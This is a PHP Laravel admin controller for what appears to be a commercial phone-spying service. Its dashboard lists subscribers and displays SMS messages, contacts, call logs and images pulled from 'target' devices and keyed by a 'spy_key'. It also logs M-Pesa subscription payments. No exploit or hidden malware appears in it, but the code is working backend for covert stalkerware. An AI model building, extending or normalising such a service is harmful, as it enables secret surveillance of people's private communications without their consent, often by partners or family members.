<?php

namespace App\Http\Controllers;

use App\Models\CallLogs;
use App\Models\Contact;
use App\Models\Images;
use App\Models\Message;
use App\Models\MpesaTransaction;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AdminController extends Controller
{
    public function __construct(){
        $this->middleware('auth:admin');
    }

    //direct admin to the dashboard
    public function dashboard(){
        $user = User::find(Auth::user()->id);
        $latest_users = User::take(6)->get();
        $total_users = User::count();
        $total_messages = Message::count();
        $total_contacts = Contact::count();
        $total_call_logs = CallLogs::count();
        $total_images = Images::count();

        return view('dashboard.admin', compact('latest_users'))->with('user', $user)
            ->with('total_messages', $total_messages)
            ->with('total_contacts', $total_contacts)
            ->with('total_call_logs', $total_call_logs)
            ->with('total_images', $total_images)
            ->with('total_users', $total_users);
    }

    public function users(){
        $users = User::latest()->paginate(10);

        return view('dashboard.users.index', compact('users'))
            ->with('i', (request()->input('page', 1) - 1) * 20);
    }

    public function view_users($user_id){
        $user = User::find($user_id);

        $messages_no = Message::where('spy_key', $user->spy_key)->count();
        $contacts_no = Contact::where('spy_key', $user->spy_key)->count();
        $call_logs = CallLogs::where('spy_key', $user->spy_key)->count();
        $images_no = Images::where('spy_key', $user->spy_key)->count();

        return view('dashboard.users.show')
            ->with('user', $user)
            ->with('messages', $messages_no)
            ->with('contacts', $contacts_no)
            ->with('call_logs', $call_logs)
            ->with('images', $images_no);
    }

    public function add_payment_code(Request $request, $user_id){
        $request->validate([
            'merchant_id'=>'required',
            'transaction_date'=>'required',
            'phone_number'=>'required'
        ]);

        $data = $request->all();

        $mpesa = new MpesaTransaction();
        $mpesa->Amount = 500;
        $mpesa->MpesaReceiptNumber = $data['merchant_id'];
        $mpesa->TransactionDate = $data['transaction_date'];
        $mpesa->PhoneNumber = $data['phone_number'];

        $mpesa->save();

        $user = User::find($user_id);
        if ($user->target_device_name == ""){
            $user->merchant_id = $data['merchant_id'];
            $user->update();
        }

        return redirect()->route('dashboard.users.view', $user_id)->with('success', 'Details updated successfully');
    }

    public function messages(){
        $messages = Message::select('spy_key','device', 'id')->groupBy('spy_key')->paginate(10);
        $messages_no = Message::select('spy_key', 'id')->groupBy('spy_key')->count();

        return view('dashboard.messages.index', compact('messages'))
            ->with('i', (request()->input('page', 1) - 1) * 20)
            ->with('messages_no', $messages_no);
    }

    public function get_messages_by_spy_key($spy_key){
        $messages = Message::where('spy_key', $spy_key)->groupBy('phone_number')->paginate(20);
        $messages_no = Message::where('spy_key', $spy_key)->groupBy('phone_number');

        $device = '';
        foreach ($messages as $msg){
            $device = $msg->device;
        }
        return view('dashboard.messages.show', compact('messages'))
            ->with('i', (request()->input('page', 1) - 1) * 20)
            ->with('device', $device)
            ->with('messages_no', $messages_no);
    }

    public function contacts(){
        $contacts = Contact::select('spy_key','device','id')->groupBy('spy_key')->paginate(10);
        $contact_no = Contact::select('spy_key', 'id')->groupBy('spy_key')->count();

        return view('dashboard.contacts.index', compact('contacts'))
            ->with('i', (request()->input('page', 1) - 1) * 20)
            ->with('contact_no', $contact_no);
    }

    public function get_contacts_by_spy_key($spy_key){
        $contacts = Contact::where('spy_key', $spy_key)->latest()->paginate(20);
        $device = '';
        foreach ($contacts as $phone_number){
            $device = $phone_number->device;
        }
        return view('dashboard.contacts.show', compact('contacts'))
            ->with('i', (request()->input('page', 1) - 1) * 20)
            ->with('device', $device);
    }

    public function call_logs(){
        $call_logs = CallLogs::select('spy_key','device', 'id')->groupBy('spy_key')->paginate(10);
        $call_logs_no = CallLogs::select('spy_key', 'id')->groupBy('spy_key')->count();

        return view('dashboard.call_logs.index', compact('call_logs'))
            ->with('i', (request()->input('page', 1) - 1) * 20)
            ->with('call_logs_no', $call_logs_no);
    }

    public function get_call_logs_by_spy_key($spy_key){
        $call_logs = CallLogs::where('spy_key', $spy_key)->latest()->paginate(20);
        $device = '';
        foreach ($call_logs as $call_log){
            $device = $call_log->device;
        }
        return view('dashboard.call_logs.show', compact('call_logs'))
            ->with('i', (request()->input('page', 1) - 1) * 20)
            ->with('device', $device);
    }

    public function get_images(){
        $images = Images::select('spy_key', 'device', 'id')->groupBy('spy_key')->paginate(10);
        $images_no = Images::select('spy_key', 'id')->groupBy('spy_key')->count();

        return view('dashboard.images.index', compact('images'))
            ->with('i', (request()->input('page', 1) - 1) * 20)
            ->with('images_no', $images_no);
    }
}
